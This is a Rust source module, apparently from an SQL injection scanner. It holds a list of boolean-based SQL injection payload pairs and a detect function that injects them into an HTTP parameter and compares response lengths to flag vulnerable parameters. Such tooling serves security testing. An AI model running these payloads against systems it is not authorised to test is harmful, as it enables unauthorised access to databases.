use std::collections::HashMap;

use crate::cli::Method;
use crate::http::HttpClient;
use crate::injections::Injection;

/// Pairs of (true_condition_payload, false_condition_payload).
/// The true condition should cause the page to return data normally,
/// while the false condition should cause it to return different/empty content.
const BOOLEAN_PAIRS: &[(&str, &str)] = &[
    (" AND 1=1-- -", " AND 1=2-- -"),
    (" AND 1=1#", " AND 1=2#"),
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ("' AND 1=1#", "' AND 1=2#"),
    ("1' AND '1'='1'-- -", "1' AND '1'='2'-- -"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("\" AND 1=1-- -", "\" AND 1=2-- -"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("') AND (1=1)-- -", "') AND (1=2)-- -"),
];

pub struct BooleanBased;

impl Injection for BooleanBased {
    fn name(&self) -> &'static str {
        "boolean-based"
    }

    fn detect(
        &self,
        client: &HttpClient,
        url: &str,
        method: &Method,
        params: &HashMap<String, String>,
        param: &str,
    ) -> Option<String> {
        let original = params.get(param).cloned().unwrap_or_default();

        // Get baseline response
        let baseline = match client.send_raw(url, method, params) {
            Ok((_, body, _)) => body,
            Err(_) => return None,
        };

        for &(true_payload, false_payload) in BOOLEAN_PAIRS {
            let true_val = format!("{}{}", original, true_payload);
            let false_val = format!("{}{}", original, false_payload);

            let true_body = match client.send(url, method, params, param, &true_val) {
                Ok((_, body, _)) => body,
                Err(_) => continue,
            };

            let false_body = match client.send(url, method, params, param, &false_val) {
                Ok((_, body, _)) => body,
                Err(_) => continue,
            };

            let baseline_len = baseline.len();
            let true_len = true_body.len();
            let false_len = false_body.len();

            // Vulnerable if:
            // 1. True response resembles baseline, false response differs significantly
            // 2. There's a significant length difference between true and false responses
            let true_diff = (true_len as i64 - baseline_len as i64).unsigned_abs() as usize;
            let false_diff = (false_len as i64 - baseline_len as i64).unsigned_abs() as usize;

            let significant_diff = true_len > 0
                && false_len > 0
                && (true_len as i64 - false_len as i64).unsigned_abs() as usize
                    > (true_len.max(false_len) / 10).max(20);

            // True condition closer to baseline than false condition
            let differential = true_diff < false_diff && false_diff > 20;

            if significant_diff || differential {
                return Some(true_payload.to_string());
            }
        }
        None
    }
}
